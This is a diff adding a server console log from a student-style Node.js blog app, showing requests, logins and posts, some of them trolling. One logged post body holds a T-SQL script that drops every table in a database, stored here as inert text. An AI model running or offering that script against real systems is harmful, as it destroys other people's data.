@@ -885,3 +885,1292 @@ npm ERR! This is probably not a problem with npm. There is likely additional log
 
 npm ERR! A complete log of this run can be found in:
 npm ERR!     /home/bitnami/.npm/_logs/2019-04-17T20_36_57_629Z-debug.log
+
+> blogger@0.0.0 start /home/bitnami/blogger6
+> node ./bin/www
+
+Mongoose connected to mongodb://blog:blog@localhost:27017/blog
+[0mGET / [36m304 [0m4.928 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.824 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.430 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.356 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.294 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.507 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m19.313 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m3.937 ms - -[0m
+[0mGET / [32m200 [0m2.398 ms - 7433[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.480 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.351 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.397 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.283 ms - -[0m
+[0mGET /nav/navigation.html [32m200 [0m0.815 ms - 693[0m
+[0mGET /favicon.ico [0m- [0m- ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.241 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.197 ms - 357[0m
+[0mGET / [36m304 [0m0.541 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.368 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.367 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.367 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.386 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.469 ms - -[0m
+[0mPOST /api/login [32m200 [0m30.279 ms - 253[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.172 ms - -[0m
+[0mPOST /api/login [33m401 [0m2.350 ms - 33[0m
+[0mPOST /api/register [32m200 [0m25.202 ms - 252[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m1.977 ms - -[0m
+{ blogTitle: 'Get a life',
+  blogText: 'You\'re been hackskeepered',
+  userName: 'Anonymous Troll',
+  userEmail: 'troll@gmail.com' }
+{ _id: 5cbd276dbae1b279e4edd9f6,
+  blogTitle: 'Get a life',
+  blogText: 'You\'re been hackskeepered',
+  userName: 'Anonymous Troll',
+  userEmail: 'troll@gmail.com',
+  createdOn: 2019-04-22T02:31:09.006Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m13.428 ms - 204[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.464 ms - 557[0m
+[0mGET / [32m200 [0m0.533 ms - 7433[0m
+[0mGET / [36m304 [0m0.394 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.329 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.281 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.273 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.303 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.398 ms - -[0m
+[0mGET / [32m200 [0m0.765 ms - 7433[0m
+[0mGET / [32m200 [0m0.748 ms - 7433[0m
+[0mGET /blogApp.js [32m200 [0m0.533 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m0.525 ms - 756[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.564 ms - 3884[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m0.652 ms - 19546[0m
+[0mGET /favicon.ico [33m404 [0m1.401 ms - 1395[0m
+[0mGET /nav/navigation.html [32m200 [0m0.644 ms - 693[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m3.798 ms - 557[0m
+[0mGET / [36m304 [0m0.438 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.336 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.312 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.293 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.323 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.357 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.239 ms - -[0m
+[0mGET / [36m304 [0m0.391 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.316 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.332 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.601 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.635 ms - -[0m
+[0mGET /favicon.ico [0m- [0m- ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.406 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.552 ms - -[0m
+[0mGET / [36m304 [0m0.382 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.380 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.340 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.323 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.337 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.470 ms - -[0m
+[0mPOST /api/register [32m200 [0m15.059 ms - 241[0m
+[0mPOST /api/register [32m200 [0m14.734 ms - 247[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.721 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.461 ms - -[0m
+{ blogTitle: 'hmm',
+  blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv' }
+{ _id: 5cbd27ddbae1b279e4edd9f9,
+  blogTitle: 'hmm',
+  blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv',
+  createdOn: 2019-04-22T02:33:01.566Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m3.164 ms - 383[0m
+{ blogTitle: 'My name is Grant',
+  blogText: 'And I suck.',
+  userName: 'Grant_Sucks',
+  userEmail: 'grant@sucks.biz' }
+{ _id: 5cbd27ddbae1b279e4edd9fa,
+  blogTitle: 'My name is Grant',
+  blogText: 'And I suck.',
+  userName: 'Grant_Sucks',
+  userEmail: 'grant@sucks.biz',
+  createdOn: 2019-04-22T02:33:01.810Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m2.755 ms - 192[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.611 ms - 1124[0m
+[0mGET / [36m304 [0m0.405 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.361 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.798 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.281 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.302 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.361 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.550 ms - 1124[0m
+[0mGET / [32m200 [0m0.770 ms - 7433[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.330 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.289 ms - -[0m
+[0mGET /blogApp.js [32m200 [0m0.459 ms - 9242[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.284 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m0.747 ms - 1395[0m
+[0mGET /nav/navigation.html [36m304 [0m0.387 ms - -[0m
+[0mGET / [36m304 [0m0.410 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.342 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.648 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.605 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.314 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m2.236 ms - -[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.776 ms - -[0m
+[0mGET / [36m304 [0m0.356 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.365 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.281 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.329 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.270 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.384 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m0.820 ms - 1395[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m3.881 ms - -[0m
+{ blogTitle: 'Nut me up',
+  blogText: 'cant nut up',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv' }
+{ _id: 5cbd2c68bae1b279e4edd9fb,
+  blogTitle: 'Nut me up',
+  blogText: 'cant nut up',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv',
+  createdOn: 2019-04-22T02:52:24.239Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m2.558 ms - 181[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2c68bae1b279e4edd9fb,
+    blogTitle: 'Nut me up',
+    blogText: 'cant nut up',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:52:24.239Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.975 ms - 1301[0m
+Finding blog details { blogID: '5cbd2c68bae1b279e4edd9fb' }
+{ _id: 5cbd2c68bae1b279e4edd9fb,
+  blogTitle: 'Nut me up',
+  blogText: 'cant nut up',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv',
+  createdOn: 2019-04-22T02:52:24.239Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd2c68bae1b279e4edd9fb [32m200 [0m2.953 ms - 181[0m
+Finding blog details { blogID: '5cbd2c68bae1b279e4edd9fb' }
+{ _id: 5cbd2c68bae1b279e4edd9fb,
+  blogTitle: 'Nut me up',
+  blogText: 'cant nut up',
+  userName: 'Jeep Guy',
+  userEmail: 'nut@tissues.tv',
+  createdOn: 2019-04-22T02:52:24.239Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd2c68bae1b279e4edd9fb [32m200 [0m1.561 ms - 181[0m
+Updating Blog Entry : 5cbd2c68bae1b279e4edd9fb
+{ blogTitle: 'You should probably dissable submissions',
+  blogText: 'So people stop posting questionable content' }
+[0mPUT /api/blog/5cbd2c68bae1b279e4edd9fb [32m201 [0m7.017 ms - 181[0m
+[0mGET / [32m200 [0m0.612 ms - 7433[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.555 ms - 3884[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m0.406 ms - 19546[0m
+[0mGET /blogApp.js [32m200 [0m0.389 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m0.381 ms - 756[0m
+[0mGET /nav/navigation.html [32m200 [0m0.574 ms - 693[0m
+Blog ID 5cbd2c68bae1b279e4edd9fb deleted
+[0mDELETE /api/blog/5cbd2c68bae1b279e4edd9fb [32m204 [0m2.905 ms - -[0m
+[0mGET / [36m304 [0m0.414 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.377 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.300 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.278 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.293 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.488 ms - -[0m
+Updating Blog Entry : 5cbd2c68bae1b279e4edd9fb
+{ blogTitle: 'bep me up', blogText: 'bep nut up' }
+[0mPUT /api/blog/5cbd2c68bae1b279e4edd9fb [32m201 [0m2.131 ms - 4[0m
+{ blogTitle: 'Issues with Civil Asset Forfeiture',
+  blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). 